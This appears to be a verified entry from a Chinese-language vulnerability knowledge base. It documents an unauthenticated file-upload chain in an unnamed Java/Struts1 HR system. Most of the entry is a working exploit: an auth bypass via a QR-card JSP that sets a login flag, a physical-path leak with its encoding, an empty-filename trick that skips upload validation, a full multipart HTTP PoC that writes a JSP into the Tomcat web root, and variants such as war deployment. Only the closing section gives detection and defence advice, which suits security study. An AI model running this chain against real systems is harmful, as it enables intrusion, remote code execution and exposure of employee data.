---
id: web-generic-file-upload-empty-filename-path-concat-bypass
title: 某 Java HCM 未授权文件上传链：二维码 JSP 置 islogon 登录、uploadLogo.do 回显物理路径、filename 为空绕过全局上传校验任意后缀写文件
type: scenario
domain: web
path: web/generic/file-upload
technique: empty-filename-path-concat-upload-bypass
aliases:
- filename 为空绕过上传校验
- File(parent, child) 空子路径写文件
- 二维码 JSP 未授权登录
- SafeCode 路径 ASCII 编码
tags:
- file-upload
- java
- struts
- auth-bypass
- webshell
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-23
  verified_at: '2026-11-08T13:54:34+08:00'
  notes: 已对照原文核对：未授权登录链（qrcardmain.jsp 置 islogon=true，图 02/05）、物理路径回显（pathvalue+SafeCode ASCII 编码，图 03/08-11）、filename 置空绕过全局 MainServlet 四项校验（禁~/ ../、后缀非空、魔数、白名单，图 17-19）、File(parent,child) 空 child 直接用 path（图 20-23）、bin 目录落盘（图 25）与 ~5c1.jsp 写 web 根 GET /1.jsp 200（图 26/27）证据链完整。dup-scan 3 个 pair 均为 related 非同链（@ 分隔、文件读取、base64 拼接穿越机制均不同），并列保留。原文未给产品名与版本，versions 不适用。
---

# 某 Java HCM 未授权文件上传链：二维码 JSP 置 islogon 登录、uploadLogo.do 回显物理路径、filename 为空绕过全局上传校验任意后缀写文件

## 一句话结论

某 Java（Struts1）HCM 系统可未授权访问 `/module/system/qrcard/mobilewrite/qrcardmain.jsp` 直接获得 `session.islogon=true` 的登录 Cookie，再用该 Cookie 调 `/sys/cms/uploadLogo.do`：响应页内嵌系统物理路径（经 SafeCode ASCII 编码，`~5c` 即 `\`）；上传时把完整目标路径+文件名放进 `path` 参数、把三个文件体字段（logofile/twoFile/oneFile 任一）的 `filename` 置空，因服务端 `new File(path, filename)` 在 filename 为空时直接以 path 为落盘路径、且全局上传校验 Servlet 仅对非空 filename 做后缀白名单检查，从而绕过校验写入任意后缀文件（jsp），未带路径时默认写入 Tomcat bin 目录，实测 GET `/1.jsp` 返回 200 完成 RCE。

## 原理

- 未授权登录：qrcardmain.jsp 为扫码进入场景服务，内部实例化「二维码进入」用户 `userView` 后执行 `session.setAttribute("islogon", true)` 并写入 session，鉴权过滤器只认 islogon 标志，因此任意人 GET 该 JSP 即换取合法登录态。
- 物理路径泄露：uploadLogo.do 的转發 JSP（system.cms.select_upload_file）把 `channelForm.getProjectPath()` 直接输出到 `document.getElementById('pathvalue').value`；projectpath 在 ActionForm validate 中由 `getServletContext().getRealPath("/images")` 经 `SafeCode.encode` 编码后设置。SafeCode.encode 是自定义 ASCII 编码：非字母数字字符转两位/四位十六进制并加 `~` 或 `^` 前缀，故 Windows 路径 `\` 编码为 `~5c`、`:` 等也各自有编码，解码即还原。
- 任意上传：全局校验 Servlet（MainServlet 内上传处理）对每个上传项取 `fileItem.getName()`，仅当 filename 非空才执行「禁 `~/`、`../`、截后缀查白名单、魔数比对」四项校验；而业务类 `UploadLogoTrans.uploadFile` 用 `new File(paramString(解码后的 path), paramFormFile.getFileName())` 构造落盘对象——`File(String parent, String child)` 在 child 为空字符串时结果就是 parent 本身。于是 filename 置空可同时：①跳过全部校验逻辑；②让 path 参数里拼接的文件名（含 `~5c` 还原的 `\` 与 `.jsp` 后缀）原样成为落盘绝对路径。业务代码全程无文件类型限制。
- path 不带物理路径时 File 以相对路径落盘到 Tomcat bin；配合泄露的物理路径可直接写进 webapps 应用目录（`~5cimages~5c1.jsp`），或在 webapps 下写 war 包触发自动部署。

## 触发条件

- 目标为该 Struts1 架构 HCM 系统（com.hrms/com.hjsj.hrms 包结构），`/module/system/qrcard/mobilewrite/qrcardmain.jsp` 可未授权访问；
- `/sys/cms/uploadLogo.do` 存在（struts-config 中 action path=/sys/cms/uploadLogo，forward b_upload），请求须带 `b_upload=upload` 参数进入上传流程；
- 服务端为 Tomcat（bin 目录回退路径、war 自动部署）。

## 利用步骤

1. `GET /module/system/qrcard/mobilewrite/qrcardmain.jsp` 从响应 Set-Cookie 取 JSESSIONID（已带登录态）。
2. 带 Cookie `POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1`，multipart 中 path 传占位值、logofile/twoFile/oneFile 任一传空 filename 文件体，从响应 HTML 的 `pathvalue` 取出 SafeCode 编码的物理路径，按 ASCII 规则解码（`~5c`→`\`，非字母数字转十六进制加 `~`/`^` 前缀）。
3. 再次 POST：`path` 字段填「解码后的 web 物理路径 + `~5c` + 1.jsp」，文件体 filename 置空、内容为 jsp 一句话/测试输出。
4. 不带物理路径时文件落在 Tomcat bin 目录，可先落 bin 验证再用目录穿越/已泄露路径写 web 目录。
5. `GET /1.jsp`（web 目录下）确认 200 执行，达成 RCE；也可直接在 webapps 上传 war 包。

## PoC

```http
POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
Cookie: JSESSIONID=<qrcardmain.jsp 换取的会话>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="path"

D~3a~5ctomcat~5cwebapps~5cROOT~5c1.jsp
------WebKitFormBoundary
Content-Disposition: form-data; name="logofile"; filename=""

<%= "test" %>
------WebKitFormBoundary--
```

原文实测（2024-11 记录）：path 仅填 `1.jsp` 时文件落入 Tomcat bin；path 用编码后物理路径时 `GET /1.jsp` 返回 200 且执行输出。

## 变体与关联

- 变体：任意「filename 可置空 + File(parent, child) 落盘」的 Java 上传接口都可套用该校验绕过思路；path 编码换 base64/hex 时同理先解码再拼路径。
- 变体：写入 war 包替代 jsp 直写；或写入定时任务/启动目录等非 web 路径。
- 关联：与 [[web-generic-file-upload-base64-data-uri-extension-jsp]]（另一套系统 uploadLogo 接口的 base64 data-uri 上传）同属 uploadLogo 命名接口的未授权/弱校验上传，但系统、入口与绕过手法均不同。
- 关联：未授权登录依赖「业务 JSP 直接写 session 登录标志」模式，可迁移审计其他扫码进入/移动端入口。

## 检测与防御

- 检测：对 qrcardmain.jsp 等移动端入口的直接 GET 后紧跟 .do 上传请求的会话；multipart 中 filename 全空但 path 参数含 `~5c`/`.jsp` 的请求；SafeCode 类编码特征。
- 防御：业务 JSP 不得直接置登录态（扫码进入应走一次性票据校验）；上传校验应在「filename 为空」时直接拒绝而非跳过；File 落盘前对 path 做白名单目录限定；禁用 webapps 可写。
